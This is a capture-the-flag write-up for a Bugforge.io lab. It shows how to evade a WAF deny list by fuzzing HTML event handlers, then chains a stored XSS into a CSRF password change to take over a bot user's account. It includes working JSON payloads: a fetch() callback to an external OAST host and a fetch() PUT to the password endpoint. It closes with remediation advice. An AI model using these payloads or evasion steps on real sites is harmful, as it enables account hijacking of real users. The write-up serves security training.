---
date: 2026-03-10T16:45:02
draft: false
summary: Bypass a WAF blocklist to achieve cross-site scripting and account takeover
title: Fur Hire (WAF Bypass)
tags:
  - WAF
  - XSS
  - CSRF
categories:
  - writeups
  - bugforge
---

| **Lab Name**       | Fur Hire                           |
| ------------------ | ---------------------------------- |
| **Platform**       | [Bugforge.io](https://bugforge.io) |
| **Difficulty**     | Medium                             |
| **Attack Methods** | WAF Bypass, XSS, CSRF              |

## Summary

The Fur Hire team has updated their Web Application Firewall (WAF) to try to do a better job of protecting their users after the last time we popped them. Last time, we were able to bypass the WAF by adding some extra length to the body of the POST request. This time, that doesn't work by itself so our previous payload won't work. It seems like certain tags and events are blocked by the WAF, but some are not...so that's the trick with this one. We need to figure out which tags and events work to execute the cross-site scripting attack. Once we get a working cross-site scripting attack, we can leverage that vector to perform a cross-site request forgery to change the victim's password and take over their account.

## Attack Steps

### 1. Setup

Before starting the actual attack, we've got to get things set up. To do this, we need to:
- Register one recruiter account and one job seeker account
- As the recruiter, create a job listing
- As the job seeker, apply to the job the recruiter account just posted
- Back on the recruiter dashboard, view the applicants for the job you just posted. Note that there should be two applicants: your second test account, and "Jeremy Thompson". Jeremy is the bot account and will be the ultimate target for this attack. For now, we're going to focus on our test account to build a working payload. 
- Find the application for the test user and click on the "Accept" button
Once you've done this, you should observe a couple things. First, you should see the following request in your proxy:

![Initial application acceptance request](Pasted%20image%2020260310133848.png)

If you're paying attention, you should also notice the following toast popup on the job seeker's dashboard indicating that the application status has been updated to "accepted". 

![](Pasted%20image%2020260310134138.png)
At this point, your XSS spider-sense should be tingling. 
### 2. Bypass the WAF

We have a potential injection point, which could be very useful if we can get an XSS payload working there. Let's try a couple basic payloads to see what we can get working. 

In your proxy, send the `PUT` request that we previously identified to `/api/applications/:id/status` to replay/repeater. Once there, we can see if HTML is rendered. I typically start with strikethrough since it's easy to tell if it works. 

If we update the body of the `PUT` request to the following, then we find that the status IS actually rendered with the strikethrough in the popup. 

```json
{"status":"<s>accepted</s>"}
```


![](Pasted%20image%2020260310134657.png)

So now that we know that HTML is rendered, we can start building a working XSS payload. Starting with a basic `<img>` payload:

![](Pasted%20image%2020260310135215.png)

Well, crap. 

We're getting blocked, but now we need to figure out **WHAT** is getting blocked. If we take a step back and try a vanilla `<img>` tag and provide a `src` attribute pointing to an interactsh (or webhook.site, or collaborator, or any other public OAST platform) we can see that it goes through, so we know the `<img>` tag is **NOT** blocked. 

![](Pasted%20image%2020260310135752.png)

We've got a working tag, but now we need to figure out how to get JavaScript to execute in the victim's browser, so we need to find an event that isn't blocked. Here, we can see that `onerror` is blocked by the WAF. 

![](Pasted%20image%2020260310140026.png)

If we send this to automate/intruder and grab a list of events from the [PortSwigger XSS Cheatsheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet) we can start to figure out an event that gets past the WAF. 

In automate, put a placeholder at the event, as shown below:

![](Pasted%20image%2020260310140437.png)

Then use the `Simple List` payload type and paste in the full list of events from the XSS cheatsheet. Run the attack and filter responses with a 403 response code. The 200 responses indicate that the WAF was not blocking those events. 

A lot of these events probably work, but the one I used was `oncontentvisibilityautostatechange`. 

![](Pasted%20image%2020260310140730.png)

Back in the XSS cheatsheet, we find that this event handler does not require user interaction and fires on all tags when content-visibility is set to auto. 

![](Pasted%20image%2020260310140950.png)

One important thing to note here is that this payload is only compatible with Chrome browsers; it works in this case but in the real world it's just something to keep in mind. 

You might also find that certain other words are blocked, like `alert` and `prompt`. However, `print` is **NOT** blocked, and does execute in the victim's browser as shown below. 

![](Pasted%20image%2020260310141828.png)

This is great for confirming that we can bypass the WAF on our local machine, but isn't helpful for exploiting another user. Keep in mind that our injected JavaScript only executes in the browser, so if we send this payload to another user, a print dialog will open in their browser, they'll be confused, and we'll accomplish nothing. No good. 

We can, however, test to see if we can make HTTP requests using the Fetch API. We can send the following payload that makes a `GET` request to our interactsh server looking for the `/xss-worked` endpoint. 

```json
{"status":"accepted<img oncontentvisibilityautostatechange=fetch('https://cbacabxwagzphtmkverzs1dfjool1qnox.oast.fun/xss-worked') style=display:block;content-visibility:auto>"}
```

After a moment, we get a hit on interactsh and see that our XSS payload worked!

![](Pasted%20image%2020260310141640.png)

### 3. Exploit the XSS vulnerability

Now that we have a working WAF bypass, we can start trying to figure out how to exploit the XSS vulnerability. Keep in mind:

- There is another user (Jeremy) that we can target
- There's other functionality in the app that may be vulnerable that can be chained with this. 

The first thing I thought of was to check local storage to see if there was anything sensitive (e.g., tokens) stored there. Spoiler -- there aren't. In this application, the token is passed as a cookie, and the HttpOnly flag is set, so we won't be able to get that with JavaScript. 

![](Pasted%20image%2020260310142845.png)

So we need to find some other application functionality that we can chain with the XSS to continue winning. 

In the profile section, there is a password change functionality, as shown below.

![](Pasted%20image%2020260310143023.png)

Note that the password change doesn't require the current password to set a new password. That's interesting...could be a great candidate for a Cross-Site Request Forgery (CSRF) attack. For a CSRF attack to be viable, three things generally need to be true:

- ✅ The endpoint must perform a privileged action (like a password change)
- ✅ The HTTP request should not contain any unknown parameters (like a CSRF token or the user's current password)
- ✅ The session ID must be a cookie with the SameSite attribute set to `NONE` or `LAX`. 

Here we have all three. A password change is definitely a valuable privileged action, we only need the `newPassword` value so there's nothing we don't know, and the SameSite attribute is not set on the `token` cookie, so in most modern browsers this defaults to `LAX`. 

So now we can send the following payload that makes a request to the `/api/profile/password` endpoint with a new password that we control:

```json
{"status":"accepted<img oncontentvisibilityautostatechange=fetch('/api/profile/password',{'method':'PUT','headers':{'Content-Type':'application/json'},'body':atob('eyJuZXdQYXNzd29yZCI6InBhc3N3b3JkMiJ9')}) style=display:block;content-visibility:auto>"}
```

Let's break this down:
- This is making a `PUT` request (method) to the `/api/profile/password` endpoint
- The `Content-Type` header is set to `application/json`
- The body of the `PUT` request is `atob('eyJuZXdQYXNzd29yZCI6InBhc3N3b3JkMiJ9')`
	- The `atob` function decodes a base64 encoded string
	- The value `eyJuZXdQYXNzd29yZCI6InBhc3N3b3JkMiJ9` is the base64-encoded representation of `{"newPassword":"password2"}`
- So this is setting the victim user's password to `password2`

Now we just need to go back to the recruiter dashboard and accept Jeremy's application. Send that `PUT` request to replay and paste in our working payload, then resend. After a moment, the payload will send a request to the `/api/profile/password` endpoint on Jeremy's behalf, changing his password to whatever we set. 

The following login request shows that our password now works for authenticating as Jeremy: 

![](Pasted%20image%2020260310145736.png)

Awesome, we've effectively taken over Jeremy's account and can log in to his account to get the flag!

![](Pasted%20image%2020260310145910.png)

## Remediation

There's a few things the development team can implement to make this application more secure.
- Use an allow list to define acceptable values for the `/api/applications/:id/status` endpoint. For example, anything that is not the string "accepted" or "rejected" should be...rejected. In the current instance, the developers appear to be using a deny list to block certain words to prevent XSS attacks. Deny lists are generally less secure than allow lists, since it's difficult to include all possible abuse cases in the deny list and they can usually be circumvented.
- Send a CSRF token with every state-changing HTTP request and ensure that it is validated on the server-side.
- Ensure the change password functionality is implemented securely by requiring the current password as well as the new password. 

## References

[Intigriti: Cross-Site Request Forgery](https://www.intigriti.com/researchers/hackademy/cross-site-request-forgery-csrf)

[PortSwigger XSS Cheatsheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)


